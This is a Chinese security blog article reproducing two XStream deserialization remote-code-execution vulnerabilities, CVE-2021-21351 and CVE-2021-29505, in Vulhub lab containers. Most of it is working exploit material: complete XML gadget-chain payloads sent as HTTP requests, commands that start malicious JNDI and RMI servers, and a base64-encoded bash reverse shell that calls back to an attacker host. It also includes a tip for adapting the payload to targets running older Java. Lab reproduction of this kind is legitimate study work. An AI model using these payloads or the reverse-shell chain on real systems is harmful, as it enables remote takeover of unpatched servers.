> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2AzRfOte0Po7MeKFQ8sz9Q)

Xstream 反序列化漏洞复现
================

一、Xstream 简介
------------

XStream 是一个轻量级、简单易用的开源 Java 类库，用来将对象序列化成 XML （JSON）或反序列化为对象; 反之亦然 (即：可以轻易的将 Java 对象和 xml 文档相互转换)。

二、Xstream 优点
------------

```
使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。
无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。
性能 - XStream快速和低内存占用，适合于大对象图或系统。
干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。
不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。
完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。
可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。
安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。
错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。
另一种输出格式 - XStream支持其它的输出格式，如JSON。
```

三、Vulhub Xstream 漏洞复现
---------------------

### 1、XStream 反序列化命令执行漏洞（CVE-2021-21351）

#### (1) 漏洞简介

XStream 在解析 XML 文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.15 及之前版本黑名单存在缺陷，攻击者可利用 javax.naming.ldap.Rdn$RdnEntry 及 javax.sql.rowset.BaseRowSet 构造 JNDI 注入，进而执行任意命令。

参考链接

```
https://x-stream.github.io/CVE-2021-21351.html
https://paper.seebug.org/1543/
https://www.veracode.com/blog/research/exploiting-jndi-injections-java
https://github.com/welk1n/JNDI-Injection-Exploit/
```

#### (2) 影响版本

```
Xstream <= 1.4.15
```

#### (3) 漏洞启动

执行如下命令启动一个`Springboot + XStream 1.4.15`的环境

```
cd xstream/CVE-2021-21351sudo docker-compose up -dsudo docker ps
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGULib3Q997FVvtv50dRZTxfibDSO5dfVATZ5pd18m0icVMyIzx2WA47u8Bw/640?wx_fmt=jpeg)

#### (4) 漏洞复现

##### 4.1、命令执行 Poc

访问 URL

```
http://192.168.2.6:8080/
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUbJOz48qVjXbXiaXfrnRTKtL7oPiafPQlUwpQUs0G00EqqJoI1BVT7E5Q/640?wx_fmt=jpeg)替换 Java 版本

```
cd /opttar zxvf jdk-8u211-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_211/bin/j* /usr/binjavac -versionjava -version
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGULYryMbSogB0v8icgMG3G49C8Nic7ic9DZzWLUP5o5e5bDKxwcMy8XcVSw/640?wx_fmt=jpeg)

使用如下工具开启一个恶意的 JNDI 服务器

```
https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0
```

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C [执行的命令] -A [开启ldap服务的vps]java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/success" -A 192.168.2.8
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUicdibQz74AkafRtL2ompwciaNseTo9icvNVTWzibW9F9BgYPU6iaB24vY1Ig/640?wx_fmt=jpeg)

使用上图中基于`SpringBoot`利用链的 RMI 地址作为`<dataSource>`的值

抓包构造 Poc, 将上图内生成的 rmi 接口贴进来

```
<dataSource>rmi://192.168.2.8:1099/qaufh0</dataSource>
```

```
POST / HTTP/1.1Host: 192.168.2.6:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/xmlContent-Length: 3182<sorted-set>  <javax.naming.ldap.Rdn_-RdnEntry>    <type>ysomap</type>    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>      <m__DTMXRTreeFrag>        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>          <m__size>-10086</m__size>          <m__mgrDefault>            <__overrideDefaultParser>false</__overrideDefaultParser>            <m__incremental>false</m__incremental>            <m__source__location>false</m__source__location>            <m__dtms>              <null/>            </m__dtms>            <m__defaultHandler/>          </m__mgrDefault>          <m__shouldStripWS>false</m__shouldStripWS>          <m__indexing>false</m__indexing>          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>              <javax.sql.rowset.BaseRowSet>                <default>                  <concurrency>1008</concurrency>                  <escapeProcessing>true</escapeProcessing>                  <fetchDir>1000</fetchDir>                  <fetchSize>0</fetchSize>                  <isolation>2</isolation>                  <maxFieldSize>0</maxFieldSize>                  <maxRows>0</maxRows>                  <queryTimeout>0</queryTimeout>                  <readOnly>true</readOnly>                  <rowSetType>1004</rowSetType>                  <showDeleted>false</showDeleted>                  <dataSource>rmi://192.168.2.8:1099/qaufh0</dataSource>                  <listeners/>                  <params/>                </default>              </javax.sql.rowset.BaseRowSet>              <com.sun.rowset.JdbcRowSetImpl>                <default/>              </com.sun.rowset.JdbcRowSetImpl>            </fPullParserConfig>            <fConfigSetInput>              <class>com.sun.rowset.JdbcRowSetImpl</class>              <name>setAutoCommit</name>              <parameter-types>                <class>boolean</class>              </parameter-types>            </fConfigSetInput>            <fConfigParse reference='../fConfigSetInput'/>            <fParseInProgress>false</fParseInProgress>          </m__incrementalSAXSource>          <m__walker>            <nextIsRaw>false</nextIsRaw>          </m__walker>          <m__endDocumentOccured>false</m__endDocumentOccured>          <m__idAttributes/>          <m__textPendingStart>-1</m__textPendingStart>          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>          <m__pastFirstElement>false</m__pastFirstElement>        </m__dtm>        <m__dtmIdentity>1</m__dtmIdentity>      </m__DTMXRTreeFrag>      <m__dtmRoot>1</m__dtmRoot>      <m__allowRelease>false</m__allowRelease>    </value>  </javax.naming.ldap.Rdn_-RdnEntry>  <javax.naming.ldap.Rdn_-RdnEntry>    <type>ysomap</type>    <value class='com.sun.org.apache.xpath.internal.objects.XString'>      <m__obj class='string'>test</m__obj>    </value>  </javax.naming.ldap.Rdn_-RdnEntry></sorted-set>
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUqKgMuatmBcgWVx988PyKAqPoet6ElDaSBwUoEAkXe66tnibpamv3oAg/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGU48RkwdzPls5mF6voOH9dP1ObIZOKdQdicTVCNjZKhDdUWEV3rSOATPA/640?wx_fmt=jpeg)

然后，进入目标容器内，可见 touch /tmp/success 已成功执行![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUVBEHibO5kqWvGS8HXfAmw15cNsMic7oW7cV0SvXKq1U5eaVz5qorPicug/640?wx_fmt=jpeg)

在实战中，如果目标 Java 版本较低，POC 需要做修改，将其中的`<__overrideDefaultParser>false</__overrideDefaultParser>`改成`<__useServicesMechanism>false</__useServicesMechanism>`即可。

##### 4.2、反弹 Shell Poc

反弹 shell 命令进行 base64 编码

```
http://www.jackson-t.ca/runtime-exec-payloads.htmlbash -i >& /dev/tcp/192.168.2.4/9999 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUiavlII0KryibacBQYRNYvRqQ5Fibs9ZVwiaBSRI6kVFRTvAvibrzaFZPfyA/640?wx_fmt=jpeg)

开启 rmi 恶意服务

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.2.8
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUG4JuMLBhNicqicLzQbGI42TDv5Psicp0KD6Jia88xPRY15NvHialJBfXwng/640?wx_fmt=jpeg)

构造请求数据包

```
<dataSource>rmi://192.168.2.8:1099/3wjuez</dataSource>
```

```
POST / HTTP/1.1Host: 192.168.2.6:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/xmlContent-Length: 3182<sorted-set>  <javax.naming.ldap.Rdn_-RdnEntry>    <type>ysomap</type>    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>      <m__DTMXRTreeFrag>        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>          <m__size>-10086</m__size>          <m__mgrDefault>            <__overrideDefaultParser>false</__overrideDefaultParser>            <m__incremental>false</m__incremental>            <m__source__location>false</m__source__location>            <m__dtms>              <null/>            </m__dtms>            <m__defaultHandler/>          </m__mgrDefault>          <m__shouldStripWS>false</m__shouldStripWS>          <m__indexing>false</m__indexing>          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>              <javax.sql.rowset.BaseRowSet>                <default>                  <concurrency>1008</concurrency>                  <escapeProcessing>true</escapeProcessing>                  <fetchDir>1000</fetchDir>                  <fetchSize>0</fetchSize>                  <isolation>2</isolation>                  <maxFieldSize>0</maxFieldSize>                  <maxRows>0</maxRows>                  <queryTimeout>0</queryTimeout>                  <readOnly>true</readOnly>                  <rowSetType>1004</rowSetType>                  <showDeleted>false</showDeleted>                  <dataSource>rmi://192.168.2.8:1099/3wjuez</dataSource>                  <listeners/>                  <params/>                </default>              </javax.sql.rowset.BaseRowSet>              <com.sun.rowset.JdbcRowSetImpl>                <default/>              </com.sun.rowset.JdbcRowSetImpl>            </fPullParserConfig>            <fConfigSetInput>              <class>com.sun.rowset.JdbcRowSetImpl</class>              <name>setAutoCommit</name>              <parameter-types>                <class>boolean</class>              </parameter-types>            </fConfigSetInput>            <fConfigParse reference='../fConfigSetInput'/>            <fParseInProgress>false</fParseInProgress>          </m__incrementalSAXSource>          <m__walker>            <nextIsRaw>false</nextIsRaw>          </m__walker>          <m__endDocumentOccured>false</m__endDocumentOccured>          <m__idAttributes/>          <m__textPendingStart>-1</m__textPendingStart>          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>          <m__pastFirstElement>false</m__pastFirstElement>        </m__dtm>        <m__dtmIdentity>1</m__dtmIdentity>      </m__DTMXRTreeFrag>      <m__dtmRoot>1</m__dtmRoot>      <m__allowRelease>false</m__allowRelease>    </value>  </javax.naming.ldap.Rdn_-RdnEntry>  <javax.naming.ldap.Rdn_-RdnEntry>    <type>ysomap</type>    <value class='com.sun.org.apache.xpath.internal.objects.XString'>      <m__obj class='string'>test</m__obj>    </value>  </javax.naming.ldap.Rdn_-RdnEntry></sorted-set>
```

成功反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUQIPlMMQibPuac8DWiaYXK0Rb15MdiaqMZAsHqvVD0oSKibU7p3ECU9lsdw/640?wx_fmt=jpeg)

### 2、XStream 反序列化命令执行漏洞（CVE-2021-29505）

#### (1) 漏洞简介

XStream 在解析 XML 文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.16 及之前版本黑名单存在缺陷，攻击者可利用`sun.rmi.registry.RegistryImpl_Stub`构造 RMI 请求，进而执行任意命令。

#### (2) 影响版本

```
Xstream <= 1.4.16
```

#### (3) 漏洞启动

执行如下命令启动一个`Springboot + XStream 1.4.16`的环境

```
cd xstream/CVE-2021-29505sudo docker-compose up -dsudo docker ps
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUT7jl07mqBENHKpGgEhKrB8YQiabBGVIgAJkJubOC4yVaL476gic2pRIg/640?wx_fmt=jpeg)

#### (4) 漏洞复现

##### 4.1、命令执行 Poc

环境启动后，我们向`http://192.168.2.6:8080/`发送一个正常的 XML 数据包，将会得到预期返回

```
POST / HTTP/1.1Host: 192.168.2.6:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Connection: closeContent-Type: application/xmlContent-Length: 96<?xml version="1.0" encoding="UTF-8"?><user>    <name>Tom</name>    <age>23</age></user>
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUb1ibToG6KTJicO6FdJppv345Ox6yY1lu0rat87uic3mvTzxvDey5INVRA/640?wx_fmt=jpeg)

作为攻击者，我们在自己的服务器上使用`ysoserial`的`JRMPListener`启动一个恶意的`RMI Registry`

ysoserial 下载

```
https://github.com/frohoff/ysoserial
```

安装 maven 编译

```
apt-get install maven
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUpS0lMKJDvLdjLUyhKz9icgjN3xxgraKfoNdmA5oibthIlZdWZKFaVwTw/640?wx_fmt=jpeg)

利用 mvn 编译

```
mvn clean package -DskipTests
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUiclNRIfZZchCSLQFOoCSj3InPCZtB2iazYWNb0y3UyR0O2wxYK3XjpGA/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUbvEIk3IiaDicM37bpMcFWeHKtrjR2T0brh1Fc6OP4azAU4RPK0liaRZOw/640?wx_fmt=jpeg)

使用`ysoserial`的`JRMPListener`启动一个恶意的`RMI Registry`

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "touch /tmp/success"
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUYgJ1KPO9BCAiaiaL7iaOLVqxmcsNpG8bkvJSbhtXSd95y9N3z3k8R526g/640?wx_fmt=jpeg)

这个 RMI Registry 在收到请求后，会返回用 CommonsCollections6 利用链构造的恶意序列化对象。

然后，我们向目标服务器发送 CVE-2021-29505 的 XML POC

构造 Poc 填写 `rmi` 的 `ip` 和端口 1099

```
<java.rmi.server.RemoteObject>                                                <string>UnicastRef</string>                                                <string>192.168.2.8</string>                                                <int>1099</int>                                                <long>0</long>                                                <int>0</int>                                                <long>0</long>                                                <short>0</short>                                                <boolean>false</boolean>                                            </java.rmi.server.RemoteObject>
```

```
POST / HTTP/1.1Host: 192.168.2.6:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Connection: closeContent-Type: application/xmlContent-Length: 3107<java.util.PriorityQueue serialization='custom'>    <unserializable-parents/>    <java.util.PriorityQueue>        <default>            <size>2</size>        </default>        <int>3</int>        <javax.naming.ldap.Rdn_-RdnEntry>            <type>12345</type>            <value class='com.sun.org.apache.xpath.internal.objects.XString'>                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>            </value>        </javax.naming.ldap.Rdn_-RdnEntry>        <javax.naming.ldap.Rdn_-RdnEntry>            <type>12345</type>            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>                    <parsedMessage>true</parsedMessage>                    <soapVersion>SOAP_11</soapVersion>                    <bodyParts/>                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>                        <attachmentsInitialized>false</attachmentsInitialized>                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>                                    <names>                                        <string>aa</string>                                        <string>aa</string>                                    </names>                                    <ctx>                                        <environment/>                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>                                            <java.rmi.server.RemoteObject>                                                <string>UnicastRef</string>                                                <string>192.168.2.8</string>                                                <int>1099</int>                                                <long>0</long>                                                <int>0</int>                                                <long>0</long>                                                <short>0</short>                                                <boolean>false</boolean>                                            </java.rmi.server.RemoteObject>                                        </registry>                                        <host>evil-ip</host>                                        <port>1099</port>                                    </ctx>                                </candidates>                            </aliases>                        </nullIter>                    </sm>                </message>            </value>        </javax.naming.ldap.Rdn_-RdnEntry>    </java.util.PriorityQueue></java.util.PriorityQueue>
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUoJSwibHZ0c18EwRhbGGp4S3jTW5nmLGhRcSacVYfwkI1uCkUSyxKLPg/640?wx_fmt=jpeg)

进入目标容器内，可见 touch /tmp/success 已成功执行

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUCMY5iagMAGZIick8IsUtO7fibHaFOw7ERDNBzYJzibGDzky9LUgzCwUU7Q/640?wx_fmt=jpeg)

##### 4.2、反弹 Shell Poc

反弹 shell 命令进行 base64 编码

```
http://www.jackson-t.ca/runtime-exec-payloads.htmlbash -i >& /dev/tcp/192.168.2.4/9999 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUiavlII0KryibacBQYRNYvRqQ5Fibs9ZVwiaBSRI6kVFRTvAvibrzaFZPfyA/640?wx_fmt=jpeg)

开启 rmi , 注意端口，1099 不成功，1098 可以

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGUulXIYDk0FTR3r8SKKFTvxEvVuq3sRsIjjg4FibeR72rjRODRWSR2IhQ/640?wx_fmt=jpeg)

构造 Poc

```
POST / HTTP/1.1Host: 192.168.2.6:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/xmlContent-Length: 3107<java.util.PriorityQueue serialization='custom'>    <unserializable-parents/>    <java.util.PriorityQueue>        <default>            <size>2</size>        </default>        <int>3</int>        <javax.naming.ldap.Rdn_-RdnEntry>            <type>12345</type>            <value class='com.sun.org.apache.xpath.internal.objects.XString'>                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>            </value>        </javax.naming.ldap.Rdn_-RdnEntry>        <javax.naming.ldap.Rdn_-RdnEntry>            <type>12345</type>            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>                    <parsedMessage>true</parsedMessage>                    <soapVersion>SOAP_11</soapVersion>                    <bodyParts/>                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>                        <attachmentsInitialized>false</attachmentsInitialized>                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>                                    <names>                                        <string>aa</string>                                        <string>aa</string>                                    </names>                                    <ctx>                                        <environment/>                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>                                            <java.rmi.server.RemoteObject>                                                <string>UnicastRef</string>                                                <string>192.168.2.8</string>                                                <int>1098</int>                                                <long>0</long>                                                <int>0</int>                                                <long>0</long>                                                <short>0</short>                                                <boolean>false</boolean>                                            </java.rmi.server.RemoteObject>                                        </registry>                                        <host>evil-ip</host>                                        <port>1099</port>                                    </ctx>                                </candidates>                            </aliases>                        </nullIter>                    </sm>                </message>            </value>        </javax.naming.ldap.Rdn_-RdnEntry>    </java.util.PriorityQueue></java.util.PriorityQueue>
```

反弹 shell 成功

![](https://mmbiz.qpic.cn/mmbiz_jpg/EG5vnf7iaBIy8aibqTZCnTXvoZTuoicWNGU8NH2Aibz159EwkQuglvuicngyqDN5m4tGfoyCyW3owAbHElVPkFWzrkw/640?wx_fmt=jpeg)

公众号

最后  

-----

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**无害实验室 sec 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的**